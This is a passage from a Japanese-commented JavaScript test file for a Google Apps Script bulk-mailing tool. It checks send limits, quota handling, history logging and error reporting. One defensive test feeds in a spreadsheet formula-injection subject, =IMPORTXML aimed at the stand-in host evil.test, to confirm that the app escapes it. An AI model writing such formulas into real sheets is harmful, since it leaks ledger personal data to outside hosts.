    assert.ok(/SB-0002/.test(r.res.message), 'どの会社が変わったかを伝えていません');
  });

  test('文面に問題があれば1通も送らない', () => {
    const r = run([L('SB-0001')], ['SB-0001'], null, { body: '{{担当者}} 様' });
    assert.strictEqual(r.res.ok, false);
    assert.deepStrictEqual(r.box.__sentTo, []);
  });

  test('本日の送信可能数が足りなければ1通も送らない', () => {
    const r = run([L('SB-0001'), L('SB-0002')], ['SB-0001', 'SB-0002'], null, { quota: 1 });
    assert.deepStrictEqual(r.box.__sentTo, [], '途中まで送って半分だけ届いています');
    assert.strictEqual(r.res.error, 'quota');
  });

  test('一度に送れる上限を超えたら、画面に伝えて札を出さない', () => {
    const many = [];
    for (let i = 1; i <= 41; i++) many.push(L('SB-' + String(i).padStart(4, '0')));
    const r = run(many, many.map(x => x['受付ID']));
    assert.deepStrictEqual(r.box.__sentTo, [], '上限を超えたのに送りはじめています');
    assert.strictEqual(r.pre.tooMany, true, '上限を超えたことを画面に伝えていません');
    assert.strictEqual(r.pre.ticket, '', '送れないのに札を出しています');
  });

  /*
   * 上の検査は「画面に札を出さない」ことしか見られない
   * （プレビューが札を出さないので、送信側の判定に届かない）。
   * **サーバー側の上限は、札を手で作って直接ぶつけて確かめる。**
   * 守りが二重にかかっているとき、片方だけを見る検査は
   * もう片方が外れても落ちない（2026-09-08、壊し検査で発覚）。
   */
  test('札を持っていても、サーバーが41件目を断る', () => {
    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
    const many = [];
    for (let i = 1; i <= 41; i++) many.push(L('SB-' + String(i).padStart(4, '0')));
    box.readLedger_ = () => ({ headers: LH, rows: many.map(r => LH.map(h => r[h])) });
    const ids = many.map(x => x['受付ID']);
    const ticket = vm.runInContext('broadcastTicket_', box)('件名', '{{お名前}} 様', ids);

    const res = call(box, 'adminBroadcastSend_', { person: '小谷' },
      { confirm: true, ids: ids, subject: '件名', body: '{{お名前}} 様', ticket: ticket });

    assert.deepStrictEqual(box.__sentTo, [], '上限を超えたのに送りはじめています');
    assert.strictEqual(res.error, 'too_many', JSON.stringify(res));
  });

  /*
   * 数式として動く値を、履歴シートにそのまま書かない。
   * 直接の害（=IMPORTXML で台帳の個人情報を外部URLに載せる）に加えて、
   * 数式化したセルは getValues() が計算結果を返すので、
   * **24時間の二重送信警告が黙って死ぬ**（2026-09-08、検証役が指摘）。
   */
  test('履歴シートに、数式として動く件名をそのまま書かない', () => {
    const r = run([L('SB-0001')], ['SB-0001'], null,
      { subject: '=IMPORTXML("https://evil.test","//a")' });
    assert.strictEqual(r.res.ok, true, JSON.stringify(r.res));
    const g = r.box.__sheets['一斉メール履歴'].grid;
    const cell = String(g[1][g[0].indexOf('件名')]);
    assert.strictEqual(cell.charAt(0), "'",
      '数式として動く件名が、そのまま書かれています：' + cell);
  });

  test('1件失敗しても、残りは送り、失敗を返す', () => {
    const r = run([L('SB-0001'), L('SB-0002')], ['SB-0001', 'SB-0002'], null,
      { failFor: ['sb-0001@example.com'] });
    assert.strictEqual(r.res.ok, true, JSON.stringify(r.res));
    assert.deepStrictEqual(r.res.sent, ['SB-0002']);
    assert.deepStrictEqual(r.res.failed.map(f => f.id), ['SB-0001']);
  });

  test('差し込みが解決された本文が届く（原文ではない）', () => {
    const r = run([L('SB-0001', { '担当者氏名': '花園 花子' })], ['SB-0001']);
    assert.ok(r.box.__sentMail[0].body.indexOf('花園 花子 様') >= 0,
      '差し込みが解決されないまま届いています：' + r.box.__sentMail[0].body);
    assert.ok(r.box.__sentMail[0].body.indexOf('{{') < 0);
  });

  test('変更履歴にも1行残る（1通ごとではなく、送信ごとに1行）', () => {
    const r = run([L('SB-0001'), L('SB-0002')], ['SB-0001', 'SB-0002']);
    assert.strictEqual(r.box.__history.length, 1,
      '変更履歴の行数が送信ごとに1行になっていません：' + r.box.__history.length);
  });

  /*
   * ■ setup() を実行する前の状態
   *
   *   反映の順番は GAS → けいたが setup() → ページ公開（引き継ぎ書 §3）。
   *   その途中で「メール送信」タブを開く人がいる。
   *
   *   **gas/Api.gs は例外を文言なしの server_error に潰す**ので、
   *   ここで受けないと「理由の出ないエラー」だけが画面に出る
   *   （gas/Notify.gs が台帳の列不足で同じ処理をしている）。
   */
  test('履歴シートがまだ無くても、プレビューは相手と見本を出せる', () => {
    const box = makeBox({ noHistorySheet: true });
    box.readLedger_ = () => ({ headers: LH, rows: [L('SB-0001')].map(r => LH.map(h => r[h])) });
    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷' },
      { ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様' });

    assert.strictEqual(pre.ok, true, JSON.stringify(pre));
    assert.strictEqual((pre.rows || []).length, 1, '相手が出ていません');
    assert.ok(pre.sample, '見本が出ていません');
  });

  test('履歴シートが無いことを、直し方つきで画面に伝える', () => {
    const box = makeBox({ noHistorySheet: true });
    box.readLedger_ = () => ({ headers: LH, rows: [L('SB-0001')].map(r => LH.map(h => r[h])) });
    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷' },
      { ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様' });

    assert.strictEqual(pre.historyReady, false, '履歴シートの不在を伝えていません');
    assert.strictEqual(pre.ticket, '', '送れないのに札を出しています');
  });

  /*
   * ■ 送り終えたあとの記録で例外が出ても、「送信できませんでした」と言わない
   *
   *   `appendHistory` は変更履歴シートに書く。そこが壊れていると例外になり、
   *   `gas/Api.gs` が**文言なしの server_error** に潰す。
   *   画面には「送信できませんでした」だけが出るが、**メールは全部届いている**。
   *   押した人は届いていないと思って**もう一度送る**（2026-09-08、検証役が発見）。
   */
  test('送ったあとの記録で失敗しても、送れたことを伝える', () => {
    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0) });
    const ledger = { headers: LH, rows: [L('SB-0001')].map(r => LH.map(h => r[h])) };
    box.readLedger_ = () => ledger;
    box.appendHistory = () => { throw new Error('シート「変更履歴」が見つかりません'); };

    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷' },
      { ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様' });
    const res = call(box, 'adminBroadcastSend_', { person: '小谷' },
      { confirm: true, ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様',
        ticket: pre.ticket });

    assert.strictEqual(box.__sentTo.length, 1, '送られていません');
    assert.strictEqual(res.ok, true,
      '届いているのに「送信できませんでした」と答えています：' + JSON.stringify(res));
  });

  /*
   * 送信可能数の確認が**札を消費したあと**だったので、
   * 足りなかったときに札まで失い、プレビューからやり直しになっていた。
   * 分ければ今日送れるのに「明日あらためて」と言うのも実態と違う。
   */
  test('送信可能数が足りないときは、札を使い切らない', () => {
    const box = makeBox({ now: new Date(2026, 9, 7, 12, 0), quota: 1 });
    const ledger = { headers: LH,
      rows: [L('SB-0001'), L('SB-0002')].map(r => LH.map(h => r[h])) };
    box.readLedger_ = () => ledger;
    const p = { ids: ['SB-0001', 'SB-0002'], subject: '件名', body: '{{お名前}} 様' };
    const pre = call(box, 'adminBroadcastPreview_', { person: '小谷' }, p);

    const a = call(box, 'adminBroadcastSend_', { person: '小谷' },
      Object.assign({ confirm: true, ticket: pre.ticket }, p));
    assert.strictEqual(a.error, 'quota', JSON.stringify(a));

    // 同じ札がまだ使える（残量が戻れば、そのまま送れる）
    box.MailApp = { getRemainingDailyQuota: () => 1000 };
    const b = call(box, 'adminBroadcastSend_', { person: '小谷' },
      Object.assign({ confirm: true, ticket: pre.ticket }, p));
    assert.strictEqual(b.ok, true,
      '残量が足りなかっただけで札を失っています：' + JSON.stringify(b));
  });

  test('履歴シートが無ければ、1通も送らない（記録が残せないため）', () => {
    const box = makeBox({ noHistorySheet: true });
    box.readLedger_ = () => ({ headers: LH, rows: [L('SB-0001')].map(r => LH.map(h => r[h])) });
    const res = call(box, 'adminBroadcastSend_', { person: '小谷' },
      { confirm: true, ids: ['SB-0001'], subject: '件名', body: '{{お名前}} 様',
        ticket: 'x' });

    assert.deepStrictEqual(box.__sentTo, [], '記録できない状態で送っています');
    assert.strictEqual(res.ok, false);
    assert.ok(/setup\(\)/.test(res.message || ''),
      '直し方（setup() の実行）を伝えていません：' + res.message);
  });
});
